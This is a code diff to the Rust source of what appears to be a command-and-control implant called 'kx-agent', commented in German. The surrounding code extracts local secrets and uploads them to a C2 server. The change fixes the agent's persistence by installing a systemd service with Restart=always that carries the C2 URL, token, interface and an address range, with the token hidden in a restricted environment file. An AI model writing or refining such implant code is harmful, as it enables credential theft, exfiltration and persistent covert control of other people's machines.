@@ -96,7 +96,7 @@ async fn main() {
     info!("{} lokale Secrets extrahiert und hochgeladen", local_secrets.len());
 
     // 2. Persistenz installieren.
-    if let Err(e) = install_persistence().await {
+    if let Err(e) = install_persistence(&args).await {
         error!("Persistenz-Installation fehlgeschlagen: {e}");
     } else {
         info!("Persistenz installiert");
@@ -202,7 +202,18 @@ async fn collect_local_secrets(host_id: &str) -> Vec<kx_core::c2::SecretUpload> 
 }
 
 /// Installiert Persistenz (Windows oder POSIX).
-async fn install_persistence() -> Result<(), Box<dyn std::error::Error>> {
+///
+/// Unter unix erzeugt die Unit einen vollständigen `ExecStart`: der Agent
+/// braucht `--server`, `--server-cert`, `--start` und `--end`, sonst startet
+/// er nicht. Zusammen mit `Restart=always` ergibt ein leerer `ExecStart` eine
+/// Neustart-Schleife.
+///
+/// Das Token steht **nicht** in der Unit-Datei — die ist für jeden lesbar,
+/// der die Datei lesen darf. Es landet in einer Environment-Datei mit 0600 und
+/// wird von systemd als `${KX_C2_TOKEN}` in den `ExecStart` eingesetzt. Der
+/// Agent liest es damit aus der Umgebung, wo es auch ohnehin liegt
+/// (`env = "KX_C2_TOKEN"` am Clap-Attribut).
+async fn install_persistence(args: &Args) -> Result<(), Box<dyn std::error::Error>> {
     let exe = std::env::current_exe()?;
     #[cfg(target_os = "windows")]
     {
@@ -211,7 +222,31 @@ async fn install_persistence() -> Result<(), Box<dyn std::error::Error>> {
     }
     #[cfg(unix)]
     {
-        kx_posix::install_systemd_service("kx-agent", &exe, "").await?;
+        let svc = kx_posix::SystemdService {
+            name: "kx-agent".to_string(),
+            binary_path: exe,
+            args: vec![
+                "--server".to_string(),
+                "${KX_C2_URL}".to_string(),
+                "--token".to_string(),
+                "${KX_C2_TOKEN}".to_string(),
+                "--server-cert".to_string(),
+                args.server_cert.clone(),
+                "--iface".to_string(),
+                args.iface.clone(),
+                "--start".to_string(),
+                args.start.clone(),
+                "--end".to_string(),
+                args.end.clone(),
+                "--own-ip".to_string(),
+                args.own_ip.clone(),
+            ],
+            env: vec![
+                ("KX_C2_URL".to_string(), args.server.clone()),
+                ("KX_C2_TOKEN".to_string(), args.token.clone()),
+            ],
+        };
+        kx_posix::install_systemd_service(&svc).await?;
     }
     Ok(())
 }
